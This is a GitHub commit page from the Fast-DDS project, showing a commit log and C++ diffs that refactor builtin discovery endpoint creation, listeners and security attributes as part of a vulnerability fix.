    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit 96442d58fa0b16984289bbe16a132769e9cbcd81
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Fri Nov 17 12:15:35 2023 +0100

    Refs #19770. Chages in notifyAboveRemoteEndpoints.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit cea35be6c84e633a500bd4565119d1a7ec6066da
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Fri Nov 17 11:52:15 2023 +0100

    Refs #19770. Additional work on endpoints creation.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit 02f95cf90b8acdf84c0c6dd357b8a7a26816db93
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Fri Nov 17 10:46:48 2023 +0100

    Refs #19770. Methods in PDP to setup builtin endpoints security attributes.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit 1f5c43734dfc6d420103e16132034e7e85ba0c3a
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Fri Nov 17 10:38:57 2023 +0100

    Refs #19770. Methods in PDP to create builtin endpoints attributes.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit 49624e88746389b44384f007dc17610ba929731a
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Thu Nov 16 16:56:25 2023 +0100

    Refs #19770. Endpoints creation refactor.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit 4ab8d1e1e24819da5d27009ec3e80051329dfbb0
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Thu Nov 16 16:28:15 2023 +0100

    Refs #19770. Fix unprotected access to local participant data.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit 57b99075eae290412b4d08798e1df27fc9972e1c
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Thu Nov 16 15:38:24 2023 +0100

    Refs #19770. Added SimplePDPEndpointsSecure.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit e67c703db6956e15e187868f90f1f99b25e37627
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Thu Nov 16 15:28:38 2023 +0100

    Refs #19770. Listeners moved into BuiltinReader.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit b2fe97e1e0001b24b18d4b145143139a084dc37d
Author: Mario Dominguez <mariodominguez@eprosima.com>
Date:   Wed Nov 8 15:42:34 2023 +0100

    Refs #19770. PDP listener moved into PDPEndpoints.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit 1af9da00af27591be14a1abe1d9928ccff83048d
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Thu Nov 16 13:33:37 2023 +0100

    Refs #19770. Test improvements.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit 03eeda5f6b305768cc876056ff6584c153c947d1
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Thu Nov 16 13:21:45 2023 +0100

    Refs #19770. Regression test for vulnerability.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit 6cd538753fb8be550f9b3a58c508021d2bdf6ccd
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Thu Nov 16 12:30:36 2023 +0100

    Refs #19770. Refactor on BlackboxTestsSecurity.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

Signed-off-by: Miguel Company <miguelcompany@eprosima.com>
```

* Loading branch information

[![@MiguelCompany](https://avatars.githubusercontent.com/u/36661117?s=40&v=4)](/MiguelCompany)

[MiguelCompany](/eProsima/Fast-DDS/commits?author=MiguelCompany "View all commits by MiguelCompany")
committed
Dec 18, 2023

1 parent
[3625421](/eProsima/Fast-DDS/commit/36254218a4eee641acb2c5ed4bb65de70a2c04c8)

commit f2e5cea

 Show file tree

 Hide file tree

Showing
**22 changed files**
with
**1,206 additions**
and
**617 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* include/fastdds/rtps/builtin/discovery/participant

  + include/fastdds/rtps/builtin/discovery/participant/PDP.h
    [PDP.h](#diff-5a2ff98371f4cb401f8a248874463c40a4b405221164c31be21e29d8e8911b9c)
  + include/fastdds/rtps/builtin/discovery/participant/PDPListener.h
    [PDPListener.h](#diff-53e30eb14661b9d01e29b0cc45fdb1191d79e6464064f86f545fa70672e69896)
  + include/fastdds/rtps/builtin/discovery/participant/PDPSimple.h
    [PDPSimple.h](#diff-14d7b58280b73856bfbd5d872fc65a44907722494984c7a53d86715f262f7041)
* src/cpp/rtps

  + builtin

    - src/cpp/rtps/builtin/BuiltinReader.hpp
      [BuiltinReader.hpp](#diff-365760b784659f246b2d78bd85182debe6ef7af5701386ad68f4d97942c1dbfd)
    - discovery

      * endpoint

        + src/cpp/rtps/builtin/discovery/endpoint/EDPSimple.cpp
          [EDPSimple.cpp](#diff-87d4f80f7a794b767f4d500c78d71c7bc447f87026ce3c1f45269911638a0427)
      * participant

        + DS

          - src/cpp/rtps/builtin/discovery/participant/DS/DiscoveryServerPDPEndpoints.hpp
            [DiscoveryServerPDPEndpoints.hpp](#diff-4bbf904ed2ba2c8f3cc9d7b3b4f3da3ac162cab4fe0db15974343ff11da0e042)
          - src/cpp/rtps/builtin/discovery/participant/DS/DiscoveryServerPDPEndpointsSecure.hpp
            [DiscoveryServerPDPEndpointsSecure.hpp](#diff-201f0787ac910092c3c8a1fbba44e75037a1c65c28e2b27af6b0234ae4b0e484)
          - src/cpp/rtps/builtin/discovery/participant/DS/PDPSecurityInitiatorListener.cpp
            [PDPSecurityInitiatorListener.cpp](#diff-73f39400e58ab323f0bb816be510600c97d8690e871f30332b113d269a349dd7)
          - src/cpp/rtps/builtin/discovery/participant/DS/PDPSecurityInitiatorListener.hpp
            [PDPSecurityInitiatorListener.hpp](#diff-faf0ec027784d8157a40a88bfc0ba14d690669e85ecb4078ea4d7cd03dcc334b)
        + src/cpp/rtps/builtin/discovery/participant/PDP.cpp
          [PDP.cpp](#diff-54b6c235c5c3d0cd2b56ad38317b14722d97dedc415e1f701f10f754fd746876)
        + src/cpp/rtps/builtin/discovery/participant/PDPClient.cpp
          [PDPClient.cpp](#diff-ea4a9f4ae59cc71c3bb0478382c893462a95bae2c0d8504b19dfb13a1a984457)
        + src/cpp/rtps/builtin/discovery/participant/PDPEndpoints.hpp
          [PDPEndpoints.hpp](#diff-d69ccd3f5d1a9ea3e550670091d8d064c63fbb9e3cf410578119acf0634a15a5)
        + src/cpp/rtps/builtin/discovery/participant/PDPListener.cpp
          [PDPListener.cpp](#diff-4716be00d7038bf256e2eab48c89d12d41cc1c253e4e7c68ce075c2a61d33060)
        + src/cpp/rtps/builtin/discovery/participant/PDPServer.cpp
          [PDPServer.cpp](#diff-56b23866a90ffcf208e729e2afdd347e81a0a903eec3531272b0a3ba983536c5)
        + src/cpp/rtps/builtin/discovery/participant/PDPSimple.cpp
          [PDPSimple.cpp](#diff-c99cdcc9c9ac755e92c309ceb5097c5590799e9722ad9f27ef884a6d9d105846)
        + simple

          - src/cpp/rtps/builtin/discovery/participant/simple/SimplePDPEndpoints.hpp
            [SimplePDPEndpoints.hpp](#diff-47cff676b97bc3381cca6cc5fb0fecaf9711ab73fd4857f1781443d1e2e27003)
          - src/cpp/rtps/builtin/discovery/participant/simple/SimplePDPEndpointsSecure.hpp
            [SimplePDPEndpointsSecure.hpp](#diff-34d77dbebb7f742e3870ebe7d9b80e8e9965a49ae1ad0bdcb9f5a5f419e64d59)
  + reader

    - src/cpp/rtps/reader/StatelessReader.cpp
      [StatelessReader.cpp](#diff-5bf960549dbda33be77d7f5a1fcf680656ce68d2c7b122301281d50a13764d33)
  + security

    - src/cpp/rtps/security/SecurityManager.cpp
      [SecurityManager.cpp](#diff-196ca7d94f1ae6a62cc591590a6742796c6201afbdbfe84ebedd40d225e12888)
* test

  + blackbox/common

    - test/blackbox/common/BlackboxTestsSecurity.cpp
      [BlackboxTestsSecurity.cpp](#diff-c875ffe0203903a09d102f401a8749bd255b84696d69d7afa508b4976437bcf3)
  + mock/rtps/RTPSParticipantImpl/rtps/participant

    - test/mock/rtps/RTPSParticipantImpl/rtps/participant/RTPSParticipantImpl.h
      [RTPSParticipantImpl.h](#diff-398cbffc6fc59baa2b62a7825b0162442ea7839177864a734b3da7722f88da3c)
  + unittest/rtps/discovery

    - test/unittest/rtps/discovery/PDPTests.cpp
      [PDPTests.cpp](#diff-8d2004e0a1fb382cf2e85df74db90137f40be3d686c40a77a4b0291ca76f3157)

## There are no files selected for viewing

18 changes: 14 additions & 4 deletions

18
[include/fastdds/rtps/builtin/discovery/participant/PDP.h](#diff-5a2ff98371f4cb401f8a248874463c40a4b405221164c31be21e29d8e8911b9c "include/fastdds/rtps/builtin/discovery/participant/PDP.h")

Show comments

[View file](/eProsima/Fast-DDS/blob/f2e5ceae8fbea0a6c9445a366faaca0b98a8ef86/include/fastdds/rtps/builtin/discovery/participant/PDP.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -330,9 +330,9 @@ class PDP : public fastdds::statistics::rtps::IProxyQueryable |
|  |  | \* Get a pointer to the local RTPSParticipant ParticipantProxyData object. |
|  |  | \* @return Pointer to the local RTPSParticipant ParticipantProxyData object. |
|  |  | \*/ |
|  |  | ParticipantProxyData\* getLocalParticipantProxyData() |
|  |  | ParticipantProxyData\* getLocalParticipantProxyData() const |
|  |  | { |
|  |  | return participant\_proxies\_.front(); |
|  |  | return participant\_proxies\_.empty() ? nullptr : participant\_proxies\_.front(); |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
| Expand Down  Expand Up | | @@ -431,7 +431,15 @@ class PDP : public fastdds::statistics::rtps::IProxyQueryable |
|  |  | return temp\_writer\_proxies\_; |
|  |  | } |
|  |  |  |
|  |  | ReaderAttributes create\_builtin\_reader\_attributes() const; |
|  |  |  |
|  |  | WriterAttributes create\_builtin\_writer\_attributes() const; |
|  |  |  |
|  |  | #if HAVE\_SECURITY |
|  |  | void add\_builtin\_security\_attributes( |
|  |  | ReaderAttributes& ratt, |
|  |  | WriterAttributes& watt) const; |
|  |  |  |
|  |  | virtual bool pairing\_remote\_writer\_with\_local\_reader\_after\_security( |
|  |  | const GUID\_t& local\_reader, |
|  |  | const WriterProxyData& remote\_writer\_data); |
| Expand Down  Expand Up | | @@ -501,8 +509,6 @@ class PDP : public fastdds::statistics::rtps::IProxyQueryable |
|  |  | ResourceLimitedVector<WriterProxyData\*> writer\_proxies\_pool\_; |
|  |  | //!Variable to indicate if any parameter has changed. |
|  |  | std::atomic\_bool m\_hasChangedLocalPDP; |
|  |  | //!Listener for the SPDP messages. |
|  |  | ReaderListener\* mp\_listener; |
|  |  | //! ProxyPool for temporary reader proxies |
|  |  | ProxyPool<ReaderProxyData> temp\_reader\_proxies\_; |
|  |  | //! ProxyPool for temporary writer proxies |
| Expand Down  Expand Up | | @@ -574,6 +580,10 @@ class PDP : public fastdds::statistics::rtps::IProxyQueryable |
|  |  | \*/ |
|  |  | virtual void update\_builtin\_locators() = 0; |
|  |  |  |
|  |  | void notify\_and\_maybe\_ignore\_new\_participant( |
|  |  | ParticipantProxyData\* pdata, |
|  |  | bool& should\_be\_ignored); |
|  |  |  |
|  |  | #ifdef FASTDDS\_STATISTICS |
|  |  |  |
|  |  | std::atomic<const fastdds::statistics::rtps::IProxyObserver\*> proxy\_observer\_; |
| Expand Down | |  |

38 changes: 30 additions & 8 deletions

38
[include/fastdds/rtps/builtin/discovery/participant/PDPListener.h](#diff-53e30eb14661b9d01e29b0cc45fdb1191d79e6464064f86f545fa70672e69896 "include/fastdds/rtps/builtin/discovery/participant/PDPListener.h")

Show comments

[View file](/eProsima/Fast-DDS/blob/f2e5ceae8fbea0a6c9445a366faaca0b98a8ef86/include/fastdds/rtps/builtin/discovery/participant/PDPListener.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -37,34 +37,56 @@ class PDP; |
|  |  | \* This class is implemented in order to use the same structure than with any other RTPSReader. |
|  |  | \* @ingroup DISCOVERY\_MODULE |
|  |  | \*/ |
|  |  | class PDPListener: public ReaderListener |
|  |  | class PDPListener : public ReaderListener |
|  |  | { |
|  |  |  |
|  |  | public: |
|  |  |  |
|  |  | /\*\* |
|  |  | \* @param parent Pointer to object creating this object |
|  |  | \*/ |
|  |  | PDPListener(PDP\* parent); |
|  |  | PDPListener( |
|  |  | PDP\* parent); |
|  |  |  |
|  |  | virtual ~PDPListener() override = default; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* New added cache |
|  |  | \* @param reader |
|  |  | \* @param change |
|  |  | \*/ |
|  |  | \* New added cache |
|  |  | \* @param reader |
|  |  | \* @param change |
|  |  | \*/ |
|  |  | void onNewCacheChangeAdded( |
|  |  | RTPSReader\* reader, |
|  |  | const CacheChange\_t\* const change) override; |
|  |  |  |
|  |  | protected: |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Process an incoming DATA(p). |
|  |  | \* This method is called from PDPListener::onNewCacheChangeAdded() when an alive DATA(p) is received. |
|  |  | \* Both the reader lock and the PDP lock are held when this method is called. |
|  |  | \* |
|  |  | \* @param old\_data Pointer to the ParticipantProxyData currently stored in the database. May be nullptr, for a |
|  |  | \* recently discovered participant. |
|  |  | \* @param new\_data ParticipantProxyData from the DATA(p) message. |
|  |  | \* @param writer\_guid GUID of the writer that sent the DATA(p) message. |
|  |  | \* @param reader RTPSReader that received the DATA(p) message. |
|  |  | \* @param lock Lock on the PDP database. Passed so it can be released before invoking callbacks. |
|  |  | \*/ |
|  |  | virtual void process\_alive\_data( |
|  |  | ParticipantProxyData\* old\_data, |
|  |  | ParticipantProxyData& new\_data, |
|  |  | GUID\_t& writer\_guid, |
|  |  | RTPSReader\* reader, |
|  |  | std::unique\_lock<std::recursive\_mutex>& lock); |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Get the key of a CacheChange\_t |
|  |  | \* @param change Pointer to the CacheChange\_t |
|  |  | \* @return True on success |
|  |  | \*/ |
|  |  | bool get\_key(CacheChange\_t\* change); |
|  |  | bool get\_key( |
|  |  | CacheChange\_t\* change); |
|  |  |  |
|  |  | //!Pointer to the associated mp\_SPDP; |
|  |  | PDP\* parent\_pdp\_; |
| Expand All | | @@ -82,5 +104,5 @@ class PDPListener: public ReaderListener |
|  |  | } /\* namespace fastrtps \*/ |
|  |  | } /\* namespace eprosima \*/ |
|  |  |  |
|  |  | #endif |
|  |  | #endif // ifndef DOXYGEN\_SHOULD\_SKIP\_THIS\_PUBLIC |
|  |  | #endif /\* \_FASTDDS\_RTPS\_PDPLISTENER\_H\_ \*/ |

22 changes: 22 additions & 0 deletions

22
[include/fastdds/rtps/builtin/discovery/participant/PDPSimple.h](#diff-14d7b58280b73856bfbd5d872fc65a44907722494984c7a53d86715f262f7041 "include/fastdds/rtps/builtin/discovery/participant/PDPSimple.h")

Show comments

[View file](/eProsima/Fast-DDS/blob/f2e5ceae8fbea0a6c9445a366faaca0b98a8ef86/include/fastdds/rtps/builtin/discovery/participant/PDPSimple.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -139,6 +139,28 @@ class PDPSimple : public PDP |
|  |  | \*/ |
|  |  | bool createPDPEndpoints() override; |
|  |  |  |
|  |  | bool create\_dcps\_participant\_endpoints(); |
|  |  |  |
|  |  | void match\_pdp\_remote\_endpoints( |
|  |  | const ParticipantProxyData& pdata, |
|  |  | bool notify\_secure\_endpoints); |
|  |  |  |
|  |  | void assign\_low\_level\_remote\_endpoints( |
|  |  | const ParticipantProxyData& pdata, |
|  |  | bool notify\_secure\_endpoints); |
|  |  |  |
|  |  | #if HAVE\_SECURITY |
|  |  | bool create\_dcps\_participant\_secure\_endpoints(); |
|  |  |  |
|  |  | bool pairing\_remote\_writer\_with\_local\_reader\_after\_security( |
|  |  | const GUID\_t& local\_reader, |
|  |  | const WriterProxyData& remote\_writer\_data) override; |
|  |  |  |
|  |  | bool pairing\_remote\_reader\_with\_local\_writer\_after\_security( |
|  |  | const GUID\_t& local\_reader, |
|  |  | const ReaderProxyData& remote\_reader\_data) override; |
|  |  | #endif // HAVE\_SECURITY |
|  |  |  |
|  |  | }; |
|  |  |  |
|  |  | } /\* namespace rtps \*/ |
| Expand Down | |  |

5 changes: 5 additions & 0 deletions

5
[src/cpp/rtps/builtin/BuiltinReader.hpp](#diff-365760b784659f246b2d78bd85182debe6ef7af5701386ad68f4d97942c1dbfd "src/cpp/rtps/builtin/BuiltinReader.hpp")

Show comments

[View file](/eProsima/Fast-DDS/blob/f2e5ceae8fbea0a6c9445a366faaca0b98a8ef86/src/cpp/rtps/builtin/BuiltinReader.hpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -22,6 +22,7 @@ |
|  |  | #include <memory> |
|  |  |  |
|  |  | #include <fastdds/rtps/history/ReaderHistory.h> |
|  |  | #include <fastdds/rtps/reader/ReaderListener.h> |
|  |  |  |
|  |  | #include <rtps/history/ITopicPayloadPool.h> |
|  |  | #include <rtps/history/PoolConfig.h> |
| Expand Down  Expand Up | | @@ -52,6 +53,8 @@ struct BuiltinReader |
|  |  | payload\_pool\_->release\_history(cfg, true); |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | listener\_.reset(); |
|  |  | } |
|  |  |  |
|  |  | void remove\_from\_history( |
| Expand All | | @@ -75,6 +78,8 @@ struct BuiltinReader |
|  |  | std::unique\_ptr<fastrtps::rtps::ReaderHistory> history\_; |
|  |  | //! Builtin RTPS reader |
|  |  | TReader\* reader\_ = nullptr; |
|  |  | //! Listener for the builtin RTPS reader |
|  |  | std::unique\_ptr<fastrtps::rtps::ReaderListener> listener\_; |
|  |  | }; |
|  |  |  |
|  |  | } // namespace rtps |
| Expand Down | |  |

102 changes: 3 additions & 99 deletions

102
[src/cpp/rtps/builtin/discovery/endpoint/EDPSimple.cpp](#diff-87d4f80f7a794b767f4d500c78d71c7bc447f87026ce3c1f45269911638a0427 "src/cpp/rtps/builtin/discovery/endpoint/EDPSimple.cpp")

Show comments

[View file](/eProsima/Fast-DDS/blob/f2e5ceae8fbea0a6c9445a366faaca0b98a8ef86/src/cpp/rtps/builtin/discovery/endpoint/EDPSimple.cpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -382,90 +382,21 @@ void EDPSimple::set\_builtin\_writer\_history\_attributes( |
|  |  | void EDPSimple::set\_builtin\_reader\_attributes( |
|  |  | ReaderAttributes& attributes) |
|  |  | { |
|  |  | const RTPSParticipantAttributes& pattr = mp\_PDP->getRTPSParticipant()->getRTPSParticipantAttributes(); |
|  |  |  |
|  |  | // Matched writers will depend on total number of participants |
|  |  | attributes.matched\_writers\_allocation = pattr.allocation.participants; |
|  |  |  |
|  |  | // As participants allocation policy includes the local participant, one has to be substracted |
|  |  | if (attributes.matched\_writers\_allocation.initial > 1) |
|  |  | { |
|  |  | attributes.matched\_writers\_allocation.initial--; |
|  |  | } |
|  |  | if ((attributes.matched\_writers\_allocation.maximum > 1) && |
|  |  | (attributes.matched\_writers\_allocation.maximum < std::numeric\_limits<size\_t>::max())) |
|  |  | { |
|  |  | attributes.matched\_writers\_allocation.maximum--; |
|  |  | } |
|  |  |  |
|  |  | // Locators are copied from the local participant metatraffic locators |
|  |  | attributes.endpoint.unicastLocatorList.clear(); |
|  |  | for (const Locator\_t& loc : mp\_PDP->getLocalParticipantProxyData()->metatraffic\_locators.unicast) |
|  |  | { |
|  |  | attributes.endpoint.unicastLocatorList.push\_back(loc); |
|  |  | } |
|  |  | attributes.endpoint.multicastLocatorList.clear(); |
|  |  | for (const Locator\_t& loc : mp\_PDP->getLocalParticipantProxyData()->metatraffic\_locators.multicast) |
|  |  | { |
|  |  | attributes.endpoint.multicastLocatorList.push\_back(loc); |
|  |  | } |
|  |  | attributes.endpoint.external\_unicast\_locators = mp\_PDP->builtin\_attributes().metatraffic\_external\_unicast\_locators; |
|  |  | attributes.endpoint.ignore\_non\_matching\_locators = pattr.ignore\_non\_matching\_locators; |
|  |  | attributes = mp\_PDP->create\_builtin\_reader\_attributes(); |
|  |  |  |
|  |  | // Timings are configured using EDP default values |
|  |  | attributes.times.heartbeatResponseDelay = edp\_heartbeat\_response\_delay; |
|  |  |  |
|  |  | // EDP endpoints are always reliable, transsient local, keyed topics |
|  |  | attributes.endpoint.reliabilityKind = RELIABLE; |
|  |  | attributes.endpoint.durabilityKind = TRANSIENT\_LOCAL; |
|  |  | attributes.endpoint.topicKind = WITH\_KEY; |
|  |  |  |
|  |  | // Built-in EDP readers never expect inline qos |
|  |  | attributes.expectsInlineQos = false; |
|  |  | } |
|  |  |  |
|  |  | void EDPSimple::set\_builtin\_writer\_attributes( |
|  |  | WriterAttributes& attributes) |
|  |  | { |
|  |  | const RTPSParticipantAttributes& pattr = mp\_PDP->getRTPSParticipant()->getRTPSParticipantAttributes(); |
|  |  |  |
|  |  | // Matched readers will depend on total number of participants |
|  |  | attributes.matched\_readers\_allocation = pattr.allocation.participants; |
|  |  |  |
|  |  | // As participants allocation policy includes the local participant, one has to be substracted |
|  |  | if (attributes.matched\_readers\_allocation.initial > 1) |
|  |  | { |
|  |  | attributes.matched\_readers\_allocation.initial--; |
|  |  | } |
|  |  | if ((attributes.matched\_readers\_allocation.maximum > 1) && |
|  |  | (attributes.matched\_readers\_allocation.maximum < std::numeric\_limits<size\_t>::max())) |
|  |  | { |
|  |  | attributes.matched\_readers\_allocation.maximum--; |
|  |  | } |
|  |  |  |
|  |  | // Locators are copied from the local participant metatraffic locators |
|  |  | attributes.endpoint.unicastLocatorList.clear(); |
|  |  | for (const Locator\_t& loc : mp\_PDP->getLocalParticipantProxyData()->metatraffic\_locators.unicast) |
|  |  | { |
|  |  | attributes.endpoint.unicastLocatorList.push\_back(loc); |
|  |  | } |
|  |  | attributes.endpoint.multicastLocatorList.clear(); |
|  |  | for (const Locator\_t& loc : mp\_PDP->getLocalParticipantProxyData()->metatraffic\_locators.multicast) |
|  |  | { |
|  |  | attributes.endpoint.multicastLocatorList.push\_back(loc); |
|  |  | } |
|  |  | attributes.endpoint.external\_unicast\_locators = mp\_PDP->builtin\_attributes().metatraffic\_external\_unicast\_locators; |
|  |  | attributes.endpoint.ignore\_non\_matching\_locators = pattr.ignore\_non\_matching\_locators; |
|  |  | attributes = mp\_PDP->create\_builtin\_writer\_attributes(); |
|  |  |  |
|  |  | // Timings are configured using EDP default values |
|  |  | attributes.times.heartbeatPeriod = edp\_heartbeat\_period; |
|  |  | attributes.times.nackResponseDelay = edp\_nack\_response\_delay; |
|  |  | attributes.times.nackSupressionDuration = edp\_nack\_supression\_duration; |
|  |  |  |
|  |  | // EDP endpoints are always reliable, transsient local, keyed topics |
|  |  | attributes.endpoint.reliabilityKind = RELIABLE; |
|  |  | attributes.endpoint.durabilityKind = TRANSIENT\_LOCAL; |
|  |  | attributes.endpoint.topicKind = WITH\_KEY; |
|  |  | } |
|  |  |  |
|  |  | bool EDPSimple::createSEDPEndpoints() |
| Expand Down  Expand Up | | @@ -537,34 +468,7 @@ bool EDPSimple::create\_sedp\_secure\_endpoints() |
|  |  | set\_builtin\_writer\_history\_attributes(writer\_history\_att); |
|  |  | set\_builtin\_reader\_attributes(ratt); |
|  |  | set\_builtin\_writer\_attributes(watt); |
|  |  |  |
|  |  | const security::ParticipantSecurityAttributes& part\_attr = mp\_RTPSParticipant->security\_attributes(); |
|  |  |  |
|  |  | ratt.endpoint.security\_attributes().is\_submessage\_protected = part\_attr.is\_discovery\_protected; |
|  |  | ratt.endpoint.security\_attributes().plugin\_endpoint\_attributes = PLUGIN\_ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_VALID; |
|  |  |  |
|  |  | watt.endpoint.security\_attributes().is\_submessage\_protected = part\_attr.is\_discovery\_protected; |
|  |  | watt.endpoint.security\_attributes().plugin\_endpoint\_attributes = PLUGIN\_ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_VALID; |
|  |  |  |
|  |  | if (part\_attr.is\_discovery\_protected) |
|  |  | { |
|  |  | security::PluginParticipantSecurityAttributes plugin\_part\_attr(part\_attr.plugin\_participant\_attributes); |
|  |  |  |
|  |  | if (plugin\_part\_attr.is\_discovery\_encrypted) |
|  |  | { |
|  |  | ratt.endpoint.security\_attributes().plugin\_endpoint\_attributes |= |
|  |  | PLUGIN\_ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_SUBMESSAGE\_ENCRYPTED; |
|  |  | watt.endpoint.security\_attributes().plugin\_endpoint\_attributes |= |
|  |  | PLUGIN\_ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_SUBMESSAGE\_ENCRYPTED; |
|  |  | } |
|  |  | if (plugin\_part\_attr.is\_discovery\_origin\_authenticated) |
|  |  | { |
|  |  | ratt.endpoint.security\_attributes().plugin\_endpoint\_attributes |= |
|  |  | PLUGIN\_ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_SUBMESSAGE\_ORIGIN\_AUTHENTICATED; |
|  |  | watt.endpoint.security\_attributes().plugin\_endpoint\_attributes |= |
|  |  | PLUGIN\_ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_SUBMESSAGE\_ORIGIN\_AUTHENTICATED; |
|  |  | } |
|  |  | } |
|  |  | mp\_PDP->add\_builtin\_security\_attributes(ratt, watt); |
|  |  |  |
|  |  | if (m\_discovery.discovery\_config.m\_simpleEDP.enable\_builtin\_secure\_publications\_writer\_and\_subscriptions\_reader) |
|  |  | { |
| Expand Down | |  |

5 changes: 5 additions & 0 deletions

5
[src/cpp/rtps/builtin/discovery/participant/DS/DiscoveryServerPDPEndpoints.hpp](#diff-4bbf904ed2ba2c8f3cc9d7b3b4f3da3ac162cab4fe0db15974343ff11da0e042 "src/cpp/rtps/builtin/discovery/participant/DS/DiscoveryServerPDPEndpoints.hpp")

Show comments

[View file](/eProsima/Fast-DDS/blob/f2e5ceae8fbea0a6c9445a366faaca0b98a8ef86/src/cpp/rtps/builtin/discovery/participant/DS/DiscoveryServerPDPEndpoints.hpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -46,6 +46,11 @@ struct DiscoveryServerPDPEndpoints : public PDPEndpoints |
|  |  | return DISC\_BUILTIN\_ENDPOINT\_PARTICIPANT\_ANNOUNCER | DISC\_BUILTIN\_ENDPOINT\_PARTICIPANT\_DETECTOR; |
|  |  | } |
|  |  |  |
|  |  | const std::unique\_ptr<fastrtps::rtps::ReaderListener>& main\_listener() const override |
|  |  | { |
|  |  | return reader.listener\_; |
|  |  | } |
|  |  |  |
|  |  | bool enable\_pdp\_readers( |
|  |  | fastrtps::rtps::RTPSParticipantImpl\* participant) override |
|  |  | { |
| Expand Down | |  |

2 changes: 0 additions & 2 deletions

2
[src/cpp/rtps/builtin/discovery/participant/DS/DiscoveryServerPDPEndpointsSecure.hpp](#diff-201f0787ac910092c3c8a1fbba44e75037a1c65c28e2b27af6b0234ae4b0e484 "src/cpp/rtps/builtin/discovery/participant/DS/DiscoveryServerPDPEndpointsSecure.hpp")

Show comments

[View file](/eProsima/Fast-DDS/blob/f2e5ceae8fbea0a6c9445a366faaca0b98a8ef86/src/cpp/rtps/builtin/discovery/participant/DS/DiscoveryServerPDPEndpointsSecure.hpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -89,8 +89,6 @@ struct DiscoveryServerPDPEndpointsSecure : public DiscoveryServerPDPEndpoints |
|  |  |  |
|  |  | //! Builtin Simple PDP reader |
|  |  | BuiltinReader<fastrtps::rtps::StatelessReader> stateless\_reader; |
|  |  | //! Listener for stateless\_reader |
|  |  | std::unique\_ptr<fastrtps::rtps::ReaderListener> stateless\_listener; |
|  |  | }; |
|  |  |  |
